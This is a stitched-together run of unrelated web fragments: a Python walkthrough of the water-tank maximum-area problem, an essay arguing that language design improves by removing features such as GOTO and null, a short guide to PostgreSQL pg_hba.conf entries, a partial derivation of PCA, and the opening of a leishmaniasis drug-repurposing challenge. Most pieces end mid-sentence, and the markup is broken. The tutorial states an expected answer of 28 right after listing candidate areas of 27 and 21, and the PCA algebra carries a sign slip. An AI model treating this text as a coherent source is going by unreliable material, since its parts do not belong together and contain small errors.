<li>Decide if an existing algorithm can solve it directly or a special “trick” is needed;</li>
<li>Can one of the standard methodologies like graph, recursion, dynamic programming or data structures can be used?</li>
</ul>
<p>I will now pick a simple algorithmic problem and try to explain the thought process to solve it.</p>
<h2>The problem</h2>
<p>This is a well known problem that can be found in several websites that specialize on preparing candidates for programming positions.<br>
Assume a water tank which has multiple parallel movable divisors placed in different locations as can be seen in the following picture:</p>

<p><img src="http://i1.wp.com/codingismycraft.com/wp-content/uploads/2020/07/tank.gif?resize=490%2C330" alt="tank" data-recalc-dims="1"></p>

<p>To better understand the picture you have to think that its third dimension is omitted; the blue bars represent the divisors that can be removed. Each divisor is set in a specific distance that cannot change.</p>
<p>The objective is to discover the two divisors that can hold the most water when others will be removed.</p>
<h2>First thoughts</h2>
<p>Now that we have the problem clearly defined, lets pause for a second and try to put together a trivial solution which will solve it without considering its performance.</p>
<p>The fact that we are looking for a <b>pair </b>of divisors makes it obvious that if find all the divisor pairs and calculate the covering areas for each of them and simply select the largest one (we do not need to consider the third dimension since it will be the same for all the pairs.</p>
<p>Before we do any coding and using the picture above we can create the testing data to check our brutal solution and verify it.</p>
<p>Eyeballing the picture we immediately see that there are two candidate solution:</p>
<p>The 1 – 10 pair results to 3 X 9 = 27 while the 3 – 6 pair to 7 X 3 = 21 <strong>so the expected solution will be 28.</strong></p>
<h2>Describe the problem programmatically</h2>
<p>At this point it makes sense to try to describe the problem in a programming language (for this example we will use python).</p>
<p>The first thing that comes to mind is to represent the water tank programmatically. We can start by introducing a class to hold the coordinates of the upper point of each location:</p>
<pre title="">import collections
Point = collections.namedtuple("Point", ['x', 'y'])
</pre>
<p>Now using Point we can represent the tank as follows:</p>
<pre title="">tank = [Point(1, 3), Point(3, 9), Point(6, 7), Point(10, 4)]
</pre>
<p>Also we can declare the function to calculate the max_area:</p>
<pre title="">def get_max_area(points):
    pass
</pre>
<p>Since we already have calculated the expected answer we can add an assertion to validate our solution:</p>
<pre title="">assert get_max_area(tank) == 28
</pre>
<p>At this point our code should look as follows:</p>
<pre title="">import collections
Point = collections.namedtuple("Point", ['x', 'y'])

tank = [Point(1, 3), Point(3, 9), Point(6, 7), Point(10, 4)]

def get_max_area(tank):
    pass

assert get_max_area(tank) == 28
</pre>
<p>If we run the program we should see the following output:</p>
<p><img src="http://i2.wp.com/codingismycraft.com/wp-content/uploads/2020/07/tank-1.gif?resize=678%2C109" alt="tank-1" data-recalc-dims="1"></p>
<h2>A Brutal solution</h2>
<p>Assuming that we are having a pair of Points (representing two divisors) its covered area can be found if we multiply its width by the lower divisor:</p>
<p><img src="http://i1.wp.com/codingismycraft.com/wp-content/uploads/2020/07/tank-2.gif?resize=486%2C328" alt="tank-2" data-recalc-dims="1"></p>
<p>In this example the area will be covered by a 7 X 3 rectangle; 7 is the height of the lower divisor while 3 is the distance between them.</p>
<p>To simplify our solution, we can define a function which will receive two divisors as Points and return the enclosed area:</p>
<pre title="">def get_area(p1, p2):
    width = p2.x - p1.x if p2.x &gt; p1.x else p1.x - p2.x
    height = min(p2.y,  p1.y)

    return width * height
</pre>
<p>Now we are ready to implement the brutal solution. We should simply create all possible pairs of divisors, calculate the area for each of them and return the maximum value:</p>
<pre title="">import collections
import itertools

Point = collections.namedtuple("Point", ['x', 'y'])

tank = [Point(1, 3), Point(3, 9), Point(6, 7), Point(10, 4)]

def get_area(p1, p2):
    width = p2.x - p1.x if p2.x &gt; p1.x else p1.x - p2.x
    height = min(p2.y,  p1.y)

    return width * height


def get_max_area(tank):
    max_area = 0
    for p1, p2 in itertools.combinations(tank, 2):
        max_area = max(max_area, get_area(p2, p1))
    return max_area


assert get_max_area(tank) == 28
</pre>
<p>If we run the program above we will see that it completes without an error so our thought process was correct.</p>
<h2>The problem with the brutal solution</h2>
<p>Our brutal solution appears to be correct, so now let’s see how it scales. Let’s go ahead and stress test it by creating a tank that consists of a large number of points and see how it behaves. To do so we need to write a function to generate random points and call our get_max_area with increasing number of divisors:</p>
<pre title="">import collections
import itertools
import random
import timeit
import functools

Point = collections.namedtuple("Point", ['x', 'y'])


def get_area(p1, p2):
    width = p2.x - p1.x if p2.x &gt; p1.x else p1.x - p2.x
    height = min(p2.y, p1.y)

    return width * height


def random_points(count, max_height):
    for x in random.sample(range(1, count * 10), count):
        y = random.randint(1, max_height)
        yield Point(x, y)


def get_max_area(tank):
    max_area = 0
    for p1, p2 in itertools.combinations(tank, 2):
        max_area = max(max_area, get_area(p2, p1))
    return max_area


for count in [100, 1000, 5000, 10000]:
    tank = list(random_points(count=count, max_height=12))
    print(
        'count:', count, 'duration:',
        timeit.timeit(stmt=functools.partial(get_max_area, tank), number=1)
    )

</pre>
<p>So, running the above program resulted on the following output on my computer:</p>
<p><img src="http://i0.wp.com/codingismycraft.com/wp-content/uploads/2020/07/tank-3.gif?resize=599%2C132" alt="tank-3" data-recalc-dims="1"></p>
<p>As you can see although our solution works fast enough when the number of divisors is low it grows very fast and when we are trying 10,000 of them it takes more than 41 seconds!</p>
<p>The poor performance is caused from the fact that we are calculating the area for all the possible pairs.</p>
<p>We now that the possible combination of n things by k are given by the following formula:</p>
<p><img src="http://i2.wp.com/codingismycraft.com/wp-content/uploads/2020/07/CodeCogsEqn.gif?resize=169%2C44" alt="CodeCogsEqn" data-recalc-dims="1"></p>
<p>So assuming we have 10,000 divisors, the possible pairs will be:</p>
<p><img src="http://i1.wp.com/codingismycraft.com/wp-content/uploads/2020/07/combos.gif?resize=161%2C44" alt="combos" data-recalc-dims="1"></p>
<p>which equals 49,995,000 or in other words it has a time complexity of O(C(n,k)) which results into an extremely slow solution.</p>
<p>At this point we must revisit our problem and think if we can come up with a “smart trick” that will allow us to improve our solution.. Please pause for a while and think our problem again trying to detect if there is something that will allow us to bypass most of the calculations of the brutal solution and then move on to the explanation of the efficient solution..</p>
<h2>The trick</h2>
<p>Lets revisit our original example and try to go step by step to an efficient solution. This time we will start by calculating the area of the first and last point as can be seen in the following picture:</p>
<p><img src="http://i1.wp.com/codingismycraft.com/wp-content/uploads/2020/07/tank-4.gif?resize=461%2C308" alt="tank-4" data-recalc-dims="1"></p>
<p>The area between the first and the last point is: <strong>3 X (10 – 1) = 27</strong>.</p>
<p>Note that we use the point with the lower height and multiply it by the distance.</p>
<p>The trick arises is exactly here.</p>
<p>Note that for obvious the point with the lower height is impossible to result to a larger area when combined with any other point. This means that once we have calculated the first – last area in our example we can simply get rid of the first point without having to deal with it anymore.</p>
<p>This is a great improvement over the brutal solution since for it each point (including the first) has to be paired with all the others. In our example this means that for the brutal solution the first point is matched against all the three others but as we can see we do not need to do so since it is impossible to find a larger area anywhere else except the last point.</p>
<p>Following our observation, we keep the calculated area (27) remove the first point and continue to the next point as can be seen here:</p>
<p><img src="http://i0.wp.com/codingismycraft.com/wp-content/uploads/2020/07/tank-5.gif?resize=455%2C305" alt="tank-5" data-recalc-dims="1"></p>
<p>Note that now the last point is lower that the first; the enclosed area is <strong>4 X (10 – 3) = 28</strong> which replaces the previous maximum area value (was 27). Thinking in the same way we remove the last point and now our problem looks as follows:</p>
<p><img src="http://i2.wp.com/codingismycraft.com/wp-content/uploads/2020/07/tank-6.gif?resize=453%2C310" alt="tank-6" data-recalc-dims="1"></p>
<p>Now the enclosed area in <strong>7 X (6 -3) = 21</strong> which is less that the previous maximum area which remains 28 while we remove the lower Point and remain with a single point meaning that our problem is over and we have found the solution which is 28.</p>
<h2>The efficient solution</h2>
<p>Now that we have found the <strong>trick</strong> our next step is to re-write our get_max_area …</p></div></div>

    <em>Many languages have redundant features; progress in language design includes removing those features.</em>
  </p>
  <p>
    (This post is also <a href="http://postd.cc/less-is-more">available in Japanese</a>.)
  </p>
  <p>
    There are many programming languages, and new ones are being introduced all the time. Are these languages better than previous languages? Obviously, that's impossible to answer, since there's no clear measurement of what constitutes a 'better' programming language.
  </p>
  <p>
    Still, if you look at a historical trend, it looks as though one way to make a better language is to identify a redundant language feature, and design a new language that doesn't have that feature.
  </p>
  <blockquote>
      "perfection is attained not when there is nothing more to add, but when there is nothing more to remove."
      - Antoine de Saint Exupéry

  <p>
    In this article, you'll see various examples of language features that have already proven to be redundant, and other features where we are seeing strong indications that they are redundant.

    When the first computers were created, programs had to be written in machine code or assembly language. In machine code, you can express everything the CPU can do, because the machine code is written it terms of a CPU's instruction set. While it's possible to write correct programs in machine code, you can also write a lot of incorrect programs, including programs that crash horribly, or perhaps even destroy the machine on which they are running.
  </p>
  <p>
    You're most likely used to writing code in a higher-level language, but even so, if you share my experience with this, you'll agree that it takes a lot of trial and error to get things right. For every correct program, there are many incorrect variations. The set of incorrect programs is much bigger than the set of correct programs.
  </p>
  <p>
    With machine code, you have limitless ways to create incorrect programs. Yes: you can express everything the CPU can execute, but most of it will be incorrect. Thus, the set of valid programs is a small subset of the set of all possible instructions.
  </p>
  <p>

  </p>
  <p>
    Early computer programmers quickly discovered that writing in machine code was extremely error-prone, and the code was also as unreadable as it could be. One way to address this problem was to introduce assembly language, but it didn't solve the underlying problems: most assembly languages were just 'human-readable' one-to-one mappings over machine code, so you still have unlimited ways to express incorrect programs.

  </h3>
  <p>
    After having suffered with machine code and assembly language for some time, programmers figured out how to express programs in high-level languages. The first programming languages aren't in much use today, but a good example of a 'low-level' high-level language still in use today is C.
  </p>  
  <p>
    <img src="https://blog.ploeh.dk/content/binary/less-is-more-language-features-figure-02.png" alt="The set of all valid programs, inside the much larger set of all possible instructions, with the overlay of all possible instructions in a high-level language.">
  </p>
  <p>
    In C, you can express almost all valid programs. There are still tons of ways to write incorrect programs that will crash the program (or the computer), but since the language is an abstraction over machine code, there are instructions you can't express. Most of these are invalid instruction sequences anyway, so it's for the better.
  </p>
  <p>
    Notice what happened: moving from machine code to a high-level programming language removes a feature of the language. In machine code, you can express <em>anything</em>; in a high-level language, there are things you can't express. You're okay with that, because the options that were taken away from you were bad for you.

  <p>
    In 1968, Edsger Dijkstra published his (in)famous paper <em>Go To Statement Considered Harmful</em>. In it, he argued that the GOTO statement was an bad idea, and that programs would be 'better' without the GOTO statement. This sparked a decade-long controversy, but these days we've come to understand that Dijkstra was right. Some of the most popular languages in use today (e.g. Java and JavaScript) don't have GOTO at all.

  </p>
  <p>
    Since GOTO has turned out to be an entirely redundant language feature, a language without it doesn't limit your ability to express <em>valid</em> programs, but it does limit your ability to express <em>invalid</em> programs.
  </p>
  <p>
    Do you notice a pattern?
  </p>
  <p>
    Take something away, and make an improvement.
  </p>
  <p>
    There's nothing new about this; <a href="https://skillsmatter.com/skillscasts/2323-bobs-last-language">Robert C. Martin told us that years ago</a>.
  </p>
  <p>
    You can't just arbitrarily take away <em>anything</em>, because that may constrain you in such a way that there are valid programs you can no longer write:

    You have to take away the <em>right</em> features.

  <p>
    Today, everyone seems to agree that errors should be handled via some sort of exception mechanisms; at least, everyone can agree that <em>error codes</em> are <em>not</em> the way to go (and I agree). We need something richer than error codes, and something that balances usefulness with robustness.
  </p>
  <p>
    The problem with exceptions is that this mechanism is really only <a href="http://c2.com/cgi/wiki?DontUseExceptionsForFlowControl">GOTO statements in disguise</a> - and we've already learned that GOTO is considered harmful.
  </p>
  <p>
    A better approach is to use a <a href="http://en.wikipedia.org/wiki/Tagged_union">sum type</a> to indicate <em>either</em> <a href="http://fsharpforfunandprofit.com/posts/recipe-part2">success or failure in a composable form</a>.

  <p>
    As Robert C. Martin also pointed out, in older languages, including C and C++, you can manipulate pointers, but as soon as you introduce polymorphism, you no longer need 'raw' pointers. Java doesn't have pointers; JavaScript doesn't do pointers; C# <em>does</em> allow you to use pointers, but I've personally never needed them outside of interop with the Windows API.
  </p>
  <p>
    As these languages have demonstrated, you don't need access to pointers in order to be able to pass values by reference. Pointers can be abstracted away.

  <p>
    Most strongly typed languages give you an opportunity to choose between various different number types: bytes, 16-bit integers, 32-bit integers, 32-bit <em>unsigned</em> integers, single precision floating point numbers, etc. That made sense in the 1950s, but is rarely important these days; we waste time worrying about the micro-optimization it is to pick the right number type, while we lose sight of the bigger picture. As <a href="http://hanselminutes.com/396/bugs-considered-harmful-with-douglas-crockford">Douglas Crockford explains, in JavaScript there's only a <em>single</em> number type, which is a great idea - just too bad it's the wrong single number type</a>.

  </p>
  <p>
    With the modern computer resources we have today, a programming language that would restrict you to a single, sane number type would be superior to the mess we have today.

    Null pointers <a href="#7874496bf5134a66ae5a6350cbb6c04f" title="permalink">#</a>
  </h3>
  <p>
    Nulls are one of the most misunderstood language constructs. There's nothing wrong with the concept of a value that may or may not be present. Many great programming languages have this concept. In Haskell, it's called <em>Maybe</em>; in F#, it's called <em>option</em>; in T-SQL it's called <em>null</em>. What's common in all these languages is that it's an <em>opt-in</em> language feature: you can declare a value as being 'nullable', but by default, <em>it isn't</em> (nullable).
  </p>
  <p>
    However, due to <a href="http://www.infoq.com/presentations/Null-References-The-Billion-Dollar-Mistake-Tony-Hoare">Tony Hoare's self-admitted billion-dollar mistake</a>, mainstream languages have null pointers: C, C++, Java, C#. The problem isn't the <em>concept</em> of 'null', but rather that everything <em>can</em> be null, which makes it impossible to distinguish between the cases where null is an appropriate and expected value, from the cases where null is a defect.
  </p>
  <p>
    Design a language without null pointers, and you take away the ability to produce null pointer exceptions.
  </p>  
  <p>

  </p>
  <p>
    If Tony Hoare is correct that null pointers cost billions of dollars in the last few decades, getting rid of that source of defects can save you lots of money. From Turing-complete languages like T-SQL, Haskell, and F# we know that you can express all valid programs without null pointers, while a huge source of defects is removed.

  <p>
    A central concept in Procedural, Imperative, and Object-Oriented languages is that you can change the value of a variable while executing your program. That's the reason it's called a <em>variable</em>. This seems intuitive, since a CPU contains registers, and what you actually do when you execute a program is that you move values in and out of those registers. It's also intuitive because the purpose of most programs is to change the state of the world: Store a record in a database. Send an email. Repaint the screen. Print a document. Etc.

    However, it turns out that mutation is also a large source of defects in software, because it makes it much harder to reason about code. Consider a line of C# code like this:
  </p>
  <pre><span>var</span>&nbsp;r&nbsp;=&nbsp;<span>this</span>.mapper.Map(rendition);</pre>
  
  <p>
    When the <code>Map</code> method returns, has <code>rendition</code> been modified? Well, if you follow <a href="http://en.wikipedia.org/wiki/Command%E2%80%93query_separation">Command Query Separation</a>, it shouldn't, but the only way you can be sure is to review the implementation of the Map method. What if that method exhibits the same problem, by calling into other methods that <em>could</em> mutate the state of the application? There's nothing in C# (or Java, or JavaScript, etc.) that prevents this from happening.
  </p>
  <p>
    In a complicated program with a big call stack, it's impossible to reason about the code, because <em>everything</em> could mutate, and once you have tens or hundreds of variables in play, you can no longer keep track of them. Did the <code>isDirty</code> flag change? Where? What about the <code>customerStatus</code>?
  </p>
  <p>
    Imagine taking away the ability to mutate state:
  </p>
  <p>
    <img src="https://blog.ploeh.dk/content/binary/less-is-more-language-features-figure-07.png" alt="The set of all valid programs, inside the much larger set of all possible instructions, with the overlay of the set of possible instructions in a language without mutation.">
  </p>
  <p>
    Most languages don't completely take away this ability, but as Haskell (a Turing complete language) demonstrates, it's possible to write any program without implicit state mutation.
  </p>
  <p>
    At this point, many people might object that Haskell is too difficult and unintuitive, but to me, that kind of argumentation is reminiscent of the resistance to removing GOTO. If you are used to relying on GOTO, you have to learn alternative ways to model the same behaviour without GOTO. …</p></div></div>

<p>PostgreSQL instance has got restricted access by <code>pg_hba.conf</code> file(host based authentication file).</p>
<p>We can provide in it information from which <code>ADDRESS</code> to which <code>DATABASE</code> on which <code>USER</code> by what <code>METHOD</code> we allow connecting. Additionaly we have to provide <code>TYPE</code> of connection.</p>
<p>This file resides in same place where <code>postgresql.conf</code>(we can alter this behavior by setting <code>pg_hba</code> parameter in <code>postgresql.conf</code>):</p>
<div><pre><code data-lang="bash"><span>[</span>postgres@postgres-lab ~<span>]</span>$ cd /postgresql/data/

<span># IPv6 local connections:</span>
host    all             all             ::1/128                 trust
</code></pre></div><p>Allowed <code>TYPE</code>'s:</p>
<ul>
<li><code>local</code> - socket connection - needed to connect from shell on database server</li>
<li><code>host</code> - standard TCP/IP connection over the network - bnost SSL and no SSL</li>
<li><code>hostssl</code> - TCP/IP connection but only with SSL</li>
<li><code>hostnossl</code> - TCP/IP only without SSL</li>
<li><code>hostgssenc</code> - TCP/IP only GSSAPI</li>
<li><code>hostnogssenc</code> - TCP/IP only without GSSAPI</li>
</ul>
<p>With <code>DATABASE</code> we can specify database name or use special value <code>sameuser</code> if database name should be same as name of user that is connecting.</p>
<p>With <code>USER</code> we can specify user or role - role name should be preceded by <code>+</code> sign.</p>
<p><code>ADDRESS</code> field could be - hostname, IP range in CIDR format or special words:</p>
<ul>
<li><code>samehost</code> - which correspond to all IP adresses of database server</li>
<li><code>samenet</code> - which correspond to all IP in database server subnet</li>
</ul>
<p>With <code>METHOD</code> field we can set one of authentication methods - most important ones are:</p>
<ul>
<li><code>trust</code> - allow connection without password - moslty set for local connections from database server itself</li>
<li><code>reject</code> - reject connections</li>
<li><code>md5</code> - allow connections after getting from user password - encrypted</li>
<li><code>password</code> - allow connection after getting plain password - DO NOT USE in untrusted networks - better -&gt; never use this option</li>
<li><code>ldap</code> - getting account authorization data from LDAP server</li>
</ul>
<p>In <code>DATABASE</code> and <code>USER</code> fields you can specify special word <code>all</code> if you don’t want to create any restrictions here.</p>
<p>There can be situation when we must use additional field named <code>auth-options</code> for specyfying details for example for <code>hostssl</code> connection type. This topic will be covered in another post.</p>

      <p>In this post, we’ll take a deep dive into PCA, from both a mathematical and implementation perspective.
We’ll derive the equation from the ground up, look at how we can compute it and finally end with what it can be used for. This post is primarily targeted at those with a basic understanding of PCA but want to know the assumptions it relies on, its properties and derive how it can be computed.</p>
<p>If you’re interested in the repository containing the Jupyter notebook from which this is derived, it’s 
<a href="https://github.com/ymohamedahmed/blog-posts/tree/master/pca" target="_blank" rel="noopener">here</a>.</p>
<h2 id="the-optimal-coding-perspective">The optimal coding perspective</h2>
<h3 id="finding-a-low-dimensional-representation">Finding a low dimensional representation</h3>
<p>PCA can be thought of as finding a low-dimensional representation of a set of vectors. Given points in an <em>n</em>-dimensional space, we might wish to find some new <em>k</em>-dimensional space (with <em>k</em> &lt; <em>n</em>) which captures as much of the <em>essence</em> of the original space as possible. The exact definition of capturing the ‘<em>essence</em>’ is subject to design, however, we can consider it from multiple perspectives.</p>


<p><img src="https://ymohamedahmed.github.io/post/pca/images/pca.svg"></p><h3 id="the-notion-of-reconstruction-error">The notion of reconstruction error</h3>
<p>If we take our low-dimensional representation and attempt to recover the original <em>n</em>-dimensional vector of each point, we could measure how much each point varies from its reconstruction. The difference between each reconstruction and the original, is one way of measuring the effectiveness of our new <em>k</em>-dimensional space and is the approach taken by PCA.  Naturally, this requires a definition of a <em>similarity</em> between two matrices. If we have a matrix $X$ of our original points and our reconstruction $X'$ then we can define the difference between them as a sum of the square of errors $\sum_{i,j} (X-X’)_{i,j}^2$.</p>
<p>This quantity is known as the <em>Frobenius</em> norm of the matrix $||X-X'||_F$ and is essentially an extension of the L2 ($||\mathbf{v}||_2^2 =  \sum_i \mathbf{v}_i^2 = \mathbf{v}^\top \mathbf{v}$) norm from vectors to matrices. It is just a fancy name for squaring every element in a matrix and taking their sum. Crucially, however, we can see that the Frobenius norm of a matrix, $A$, is precisely equivalent to $Tr[A^\top A]$ (see the illustration below).</p>


<figure>

    <figcaption>Showing the relationship between the Frobenius norm and trace operator: $||A||_F^2 = \text{Tr}(A^\top A)$</figcaption>
</figure> 

<p>As a result, our error of interest, can be computed as $Tr[(X-X’)^\top (X-X’)]$, this will come in handy since the trace operator comes with a bunch of neat tricks for manipulating the matrices involved.</p>
<h3 id="pca-assumptions">PCA Assumptions</h3>
<p>We’ve defined how we’re going to evaluate this reconstruction, but not at all the means of performing the coding or its inverse.</p>
<p>PCA chooses to implement both the encoding and decoding as a matrix multiplication. So we can think of PCA as finding a matrix $D$ that will transform our input, $X$ to our coded version $C$ by a matrix multiplication (i.e. $C = XD$).
The matrix, $X$, being our original data of $m$ rows and $n$ columns.</p>
<p>We might choose, however, to use some matrix, $D_k$ which reduces the number of dimensions of our data from $m$ to $k$. To make it easier, we can tag the matrix with the new number of dimensions. If this is the case, then $D_k$ is of size $n \times k$ and so that the resulting coding, $C$, is of size $m \times k$.</p>
<p>One of the most crucial assumptions made by PCA is that the transformation matrix, $D_k$, has <strong>orthonormal</strong> columns. Criticially, this does not, technically, make it an <strong>orthogonal</strong> matrix since it may not be square and the rows may not be orthonormal.</p>
<p>This assumption is useful since it simplifies the reconstruction process, in fact, $X'$ can be computed as $XD_kD_k^\top$, i.e. we can use the transpose of the encoding matrix to perform the decoding.</p>
<p>To understand exactly why the reconstruction can be performed by the transpose of the matrix let’s consider a code $\mathbf{z}$ which we’ve generated as $\mathbf{z}=\mathbf{D}\mathbf{x}$ and are decoding using $\mathbf{D}^\top$.</p>
<p>The reconstruction error is $(\mathbf{x}-\mathbf{D}^\top\mathbf{z})^\top(\mathbf{x}-\mathbf{D}^\top\mathbf{z}) = \mathbf{x}^\top\mathbf{x} - \mathbf{x}^\top\mathbf{D}^\top\mathbf{z}-\mathbf{z}^\top\mathbf{D}\mathbf{x} + \mathbf{z}^\top\mathbf{D}\mathbf{D}^\top\mathbf{z}$.</p>
<p>We can take the derivative with respect to the code $\mathbf{z}$, $\nabla_\mathbf{z} = -2\mathbf{D}\mathbf{x} + 2\mathbf{D}\mathbf{D}^\top\mathbf{z}$, which given the definition of $\mathbf{z}$ is equal to $-2\mathbf{D}\mathbf{x} + 2\mathbf{D}\mathbf{D}^\top\mathbf{D}\mathbf{x}$.</p>
<p>We defined our matrix to have orthonormal columns so we know that $\mathbf{D}^\top\mathbf{D} = \mathbf{I}$ because the dot product of each column with itself will be one. Hence, our gradient is  $-2\mathbf{D}\mathbf{x} + 2\mathbf{D}\mathbf{I}\mathbf{x} = \mathbf{0}$. This tells us that our encoding/decoding system is at a stationary point in the reconstruction error. Note that this only tells us for an individual point that was encoded with a matrix that has orthonormal columns, decoding with the transpose is a good idea. It doesn’t tell us anything about how to pick $\mathbf{D}$ or what happens if you use it for multiple points.</p>
<p>Given these assumptions, we can reframe our problem as finding the coding matrix which minimises the reconstruction error.</p>
<p>This means that formally, for some given value $k$, we wish to discover the matrix $D_k^*$.</p>
<p>$$D_k^* = argmin_{D_k} ||X-X'||_F =  argmin_{D_k} ||X-XD_kD_k^\top||_F$$</p>
<h3 id="discovering-the-coding-function">Discovering the coding function</h3>
<p>Given that we wish to minimise the reconstruction error, let us attempt to discover the transformation precisely capable of this.</p>
<p>We’ll need a few tricks to get us there.</p>
<ul>
<li>$(A+B)^\top = A^\top + B^\top$</li>
<li>$(AB)^\top = B^\top A^\top$</li>
<li>$(A^\top)^\top = A$</li>
</ul>
<p>From the visual illustration, recall that we can write the reconstruction error as $\text{Tr}((X-XD_kD_k^\top)^\top(X-XD_kD_k^\top))$.</p>
<p>By using the rules  this can be expanded into $$\text{argmin}_{D_k}\text{Tr}(X^\top X -X^\top XD_kD_k^\top - D_kD_k^\top X^\top X + D_kD_k^\top X^\top XD_kD_k^\top)$$</p>
<p>We are, however, only interested in the effect of the matrix $D_k$ so we’ll axe the first term $$\text{argmin}_{D_k}\text{Tr}(-X^\top XD_kD_k^\top - D_kD_k^\top X^\top X + D_kD_k^\top X^\top XD_kD_k^\top)$$</p>
<p>Crucially, however, the trace operator has two useful properties for us:</p>
<ul>
<li>it’s insensitive to cyclic permutations (i.e. $\text{Tr}(ABC) = \text{Tr}(CAB) = \text{Tr}(BCA)$)</li>
<li>the trace of a sum of matrices is the sum of their traces (i.e $\text{Tr}(\sum_i \mathbf{A}_i) = \sum_i \text{Tr}(\mathbf{A}_i)$)</li>
</ul>
<p>Given this, we can write the equation of interest as: $$\text{argmin}_{D_k}-2\text{Tr}(-X^\top XD_kD_k^\top)+ \text{Tr}(D_kD_k^\top X^\top XD_kD_k^\top)$$.</p>
<p>Furthermore, since we define the columns of $D_k$ as being orthonormal, $\mathbf{D}_k^\top \mathbf{D}_k = \mathbf{I}$ and so we can rewrite the second term as $\text{Tr}(\mathbf{D}_k^\top \mathbf{X}^\top  \mathbf{X}\mathbf{D}_k)$ which matches the form of the first term (from permuting it) and therefore can be written as the following maximisation.</p>
<p>$$\text{argmax}_{\mathbf{D}_k} \text{Tr}(\mathbf{D}_k^\top \mathbf{X}^\top  \mathbf{X}\mathbf{D}_k)$$</p>
<p>This is sets up exactly the quantity that PCA is attempting to maximise.</p>
<h4 id="relationship-with-eigendecomposition">Relationship with eigendecomposition</h4>
<p>Having happily derived the maximisation problem, I’ll do my best to convince you that this is, in fact, maximised by having the k-columns of $\mathbf{D}_k$ as the k eigenvectors of $\mathbf{X}^\top\mathbf{X}$ with largest eigenvalues. This will roughly take the form of an inductive proof. So let’s start with considering $k=1$, that is if we had the choice of using a single vector, what would we go with?</p>
<h5 id="base-case">Base case</h5>
<p>We’ll use the lowercase, $\mathbf{d}$, to emphasise that it’s a vector rather than matrix. So let’s try and tackle:</p>
<p>$$\text{argmax}_{\mathbf{d}} \text{Tr}(\mathbf{d}^\top \mathbf{X}^\top  \mathbf{X}\mathbf{d})$$</p>
<p>The trace of a scalar, is defined as itself, so we wish to find $$\text{argmax}_{\mathbf{d}} \mathbf{d}^\top \mathbf{X}^\top  \mathbf{X}\mathbf{d}$$</p>
<p>However, recall that we mandated as our first assumption that the columns of $\mathbf{D}$ are orthonormal and hence we know that $\mathbf{d}^\top\mathbf{d} = 1$.</p>
<p>This allows us to reframe this as a constrained optimisation problem and use Lagrange multipliers to discover which vector minimises the quantity of interest whilst satisfying the norm constraint. For convenience, we’ll use $\mathbf{A} = \mathbf{X}^\top  \mathbf{X}$.</p>
<p>Hence we can write this as:
$$L(\mathbf{d}, \mathbf{A}, \lambda) = \mathbf{d}^\top \mathbf{A}\mathbf{d} - \lambda(\mathbf{d}^\top \mathbf{d} - 1)$$</p>
<blockquote>
<p>TL;DR Lagrange multipliers are just a technique for optimising a function over a specific region, in our case we’re not looking for all vectors but only ones with a norm of 1. We rewrite the function to include the constraint and take the derivative of the new function, known as the <em>Lagrangian</em>.</p>
</blockquote>
<p>By taking the derivative of $L$ we can find the solution.</p>
<p>$$\frac{\partial L}{\partial \mathbf{d}} = 2\mathbf{A}\mathbf{d} - 2\lambda\mathbf{d}$$</p>
<p>The derivative is precisely zero when $\mathbf{A}\mathbf{d} = \lambda\mathbf{d}$, that is when $\mathbf{d}$ is an eigenvector of the matrix $\mathbf{A}$.
Furthermore, we can see that the quantity in fact takes on the associated eigenvalue since $\mathbf{d}^\top \mathbf{A}\mathbf{d} = \mathbf{d}^\top \lambda\mathbf{d} = \lambda $, where $\lambda$ is the associated eigenvalue. This is always possible since we can mandate that the eigenvector has a unit norm.</p>
<p>Hence, we can see here that for the base case, the best vector is the eigenvector with the largest eigenvalue.</p>
<h5 id="inductive-step">Inductive step</h5>
<p>Having showcased our hypothesis for $k=1$, let’s see what happens for other values of $k$. Precisely, let us show that if our hypothesis is true for some arbitrary $k$ then it is also true for some $k+1$. That is the best encoding matrix with $k+1$ columns, consists of the $k+1$ unit eigenvectors with the largest associated eigenvalues.</p>
<p>We are now interested in the following problem.</p>
<p>$$\text{argmax}_{\mathbf{D}_{k+1}} \text{Tr}(\mathbf{D}_{k+1}^\top …</p></div></div>

<p>Leishmaniasis is a <a href="https://www.dndi.org/diseases-projects/leishmaniasis/">neglected disease</a>. As a disease of poverty, it has historically received <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3530408/">limited funding</a> for discovery, development and delivery of new tools. Current treatment is costly, lengthy, painful and sometimes toxic. Like a handful of similar diseases, it is the scourge of whole regions affected by them, because we still miss cheap, safe and effective cures for them.</p>
<p>At the same time, new drug candidates are being developed and old ones are being tested every day. Today, millions of drug activity assays are available at the press of a button. In this Indaba Grand Challenge, we dare to ask you to help identify amongst the already known, tested and (often) approved drugs, potential cures for different forms of leishmaniasis.</p>
<h2>Leishmaniasis</h2>

<p>Humanity has been remarkably successful in curing most of communicable diseases, be it of bacterial or viral origin. However, there remains a whole group of diseases that largely evade successful treatment – the ones transmitted by parasites. Large number of them is caused by a group of small, single-celled animals named <em><a href="https://www.dndi.org/wp-content/uploads/2018/12/Rao_Drugdiscoverykinetoplastiddiseases_ACSInfectiousDiseases_2019.pdf">kinetoplastids</a>. </em>They cause such diseases as African sleeping sickness (caused by <em>Trypanosoma brucei</em>), Chagas disease (<em>Trypanosoma cruzii</em>) and&nbsp; Leishmaniasis (different <em>Leishmania</em> species). </p>

<p>Leishmaniases (as it is a whole group of diseases), are spread by bites of sandflies and readily communicated between animals (such as dogs). Out of 30 species that attack animals, 21 affect humans. There are more than 350 million people in nearly 90 countries, that live in areas where leishmaniasis is common. Around 90% of its most dangerous variant – visceral leishmaniasis –&nbsp; is recorded&nbsp; in Bangladesh, Nepal, Sudan and Brazil, but disease is prevalent also in Mexico, South and Central America, Asia (excluding the South-East Asia), Middle East, southern Europe and Africa (in particular North and East Africa) .</p>

<p>Every year approximately 12 million people are afflicted with the disease, with over 2 million new cases each year, most of which is a cutaneous (skin) leishmaniasis (nearly 1.5 million), but nearly 25% comprises the most lethal, visceral variant. Parasite suppresses the host’s immune system to avoid eradication, which often leads to frequently lethal secondary respiratory infections.&nbsp; Yearly, approximately 50 thousand people die worldwide because of <em>Leishmania </em>caused diseases.  </p>
